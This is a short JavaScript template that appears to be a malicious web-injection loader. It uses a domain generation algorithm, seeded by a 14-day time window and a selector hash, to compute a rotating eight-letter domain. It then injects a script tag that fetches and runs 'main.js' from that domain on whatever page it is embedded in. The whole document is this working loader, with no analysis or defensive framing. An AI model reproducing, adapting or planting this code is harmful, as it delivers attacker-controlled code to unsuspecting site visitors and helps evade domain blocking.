(function(document) {
    let domainGenerator = (function(seed, hash) {
        let chars = [
            ["a", "e", "i", "o", "u", "y"],
            ["b", "c", "d", "f", "g", "h", "j", "k", "l", "m", "n", "p", "q", "r", "s", "t", "v", "w", "x", "y", "z"]
        ];

        if(hash) {
            for(let i=0;i<=hash.length-1;i++)
            {
                seed = (seed * hash.charCodeAt(i)) % 0xffffffff;
            }
        }

        let mb32=a=>(t)=>(a=a+1831565813|0,t=Math.imul(a^a>>>15,1|a),t=t+Math.imul(t^t>>>7,61|t)^t,(t^t>>>14)>>>0)/2**32;
        next = mb32(seed);

        return function(parts, tld)
        {
            let tmp = [];
            let prev = null;
            for(let i=0;i<=parts-1;i++) {
                let set;
                if(prev === null)
                {
                    set = chars[0].concat(chars[1]);
                } else if(prev == 1) {
                    set = chars[0];
                    prev = 0;
                } else {
                    set = chars[1];
                    prev = 1;
                }
                let _char = set[Math.floor(next()*set.length)];
                tmp.push(_char);
                if(prev === null) {
                    prev = chars[0].indexOf(_char) != -1 ? 0 : 1;
                }
            }
            tmp.push("." + tld);
            return tmp.join("");
        }
    });

    function getTimestampInterval(date, interval) {
        date /= 1000;
        return date - date % interval;
    }

    let gen = domainGenerator(getTimestampInterval(new Date(), 24*3600*14), "{{ SELECTOR }}");
    let domain = gen(8, "{{ TLD }}");

    if(document === null) {
        console.log('https://' + domain);
    } else {
        let script = document.createElement('script');
        script.src = 'https://' + domain + '/main.js';
        (document.body || document.head).appendChild(script);
    }
})(typeof document !== 'undefined' ? document : null);
